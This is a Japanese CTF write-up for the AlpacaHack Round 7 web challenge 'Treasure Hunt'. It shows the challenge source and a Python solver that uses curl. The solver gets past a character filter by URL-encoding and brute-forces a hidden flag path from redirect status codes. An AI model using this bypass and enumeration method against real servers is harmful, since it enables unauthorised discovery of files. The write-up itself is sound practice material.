# [AlpacaHack Round7(web)](https://alpacahack.com/ctfs/round-7)

卒業論文を進めないといけないので一問だけ解いて退散しようと思っていたらめっちゃ時間かかってしまったので供養します.  
時間ギリギリで解法がわかったものの, 実装で沼っていました.

## Treasure Hunt(71 solves)

### Description
> Can you find a treasure?

### Consideration
<details><summary>渡されたファイル群</summary>

```bash
./
├── compose.yaml
└── web/
    ├── Dockerfile
    ├── index.js
    ├── package-lock.json
    ├── package.json
    └── public/
        ├── alpaca
        ├── book
        ├── crown
        ├── drum
        ├── duck
        ├── key
        ├── pen
        ├── tokyo/
        │   └── tower
        └── wind/
            └── chime
```

</details>

<details><summary>index.js</summary>

```javascript:index.js
import express from "express";

const html = `
<h1>Treasure Hunt 👑</h1>
<p>Can you find a treasure?</p>
<ul>
  <li><a href=/book>/book</a></li>
  <li><a href=/drum>/drum</a></li>
  <li><a href=/duck>/duck</a></li>
  <li><a href=/key>/key</a></li>
  <li><a href=/pen>/pen</a></li>
  <li><a href=/tokyo/tower>/tokyo/tower</a></li>
  <li><a href=/wind/chime>/wind/chime</a></li>
  <li><a href=/alpaca>/alpaca</a></li>
</ul>
`.trim();

const app = express();

app.use((req, res, next) => {
  res.type("text");
  if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
  }
  next();
});

app.use(express.static("public"));

app.get("/", (req, res) => res.type("html").send(html));

app.listen(3000);
```

</details>

<details><summary>Dockerfile</summary>

```text
FROM node:22.11.0

WORKDIR /app

COPY public public

# Create flag.txt
RUN echo 'Alpaca{REDACTED}' > ./flag.txt

# Move flag.txt to $FLAG_PATH
RUN FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t \
    && mkdir -p $(dirname $FLAG_PATH) \
    && mv flag.txt $FLAG_PATH

COPY package.json package-lock.json ./
RUN npm install

COPY index.js .

USER 404:404
CMD node index.js
```

</details>

何を見ればflagが取得できるかはDockerfileにかいてあります.  
```text
FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t
```
flag.txtの中身のハッシュ値をとって一文字ずつディレクトリとして`/f/l/a/g/./t/x/t`と繋げています.  

`56bde24b2b0fd23d0b032c8aa128a86c -> 5/6/b/d/e/2/4/b/2/b/0/f/d/2/3/d/0/b/0/3/2/c/8/a/a/1/2/8/a/8/6/c`
`-> 5/6/b/d/e/2/4/b/2/b/0/f/d/2/3/d/0/b/0/3/2/c/8/a/a/1/2/8/a/8/6/c/f/l/a/g/./t/x/t`  
のような感じ  
だから, `http://localhost:3000/5/6/b/d/e/2/4/b/2/b/0/f/d/2/3/d/0/b/0/3/2/c/8/a/a/1/2/8/a/8/6/c/f/l/a/g/./t/x/t`  
にアクセスできればflagが取れるはずです.  

が、index.jsの22行目のif文によって'f', 'l', 'a', 'g'がURL中にあると400が返されてしまう. - (1)
```javascript
if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
}
```
さらに, 中身の知らないflag.txtのハッシュ値なのでパスもわからない. - (2)  
ここで, `http://localhost:3000/tokyo`を試すと301が返ってきます（`http://localhost:3000/tokyo/`にリダイレクトされる）.  
一方, 存在しないパス（`http:/localhost:3000/hoge`みたいな）を指定すると401が返ってきます.  

(1)は'f', 'l', 'a', 'g'をそれぞれURL Encodeされたまま送ればよい.  
(2)は返ってくるステータスコードで存在するパスかどうか判定すれば良い.  

ということでPythonのRequestsライブラリを用いてソルバを書いたのですが, (1)を満たすコードを一生かけずに時間を溶かしてしまいました.  
おそらくRequestsライブラリではURL Encodeされたままリクエストを送ることができない...?  
ということでpython内でcurlを呼び出す愚行をしました. 「shell script最高！ちゃんと勉強しようね！」ってサークルの某先輩に言われ続けてる気がした...  

以下, ソルバです

```python
import subprocess
import itertools

base_url = "http://localhost:3000"
depth = 40
characters = ["%61", "b", "c", "d", "e", "%66", "%67", "%6c", "%74", "%78", "0",
              "1", "2", "3", "4", "5", "6", "7", "8", "9"]

path = ""
for i in range(depth):
    for dirs in itertools.product(characters):
        tmp = "/".join(dirs)
        url = f"{base_url}/{path}/{tmp}"
        cmd = ["curl", "-I", url]
        res = subprocess.run(cmd, capture_output=True, text=True).stdout
        if "301" in res:
            print(res)
            path = f"{path}/{tmp}"
        else:
            continue

print(path)
```
シェル実行した結果をstringで受け取るのに苦労したのと, `if res in '301'`になっていたのに気づかない, 明らかに集合論ができない人になっていたので更に時間を溶かしました
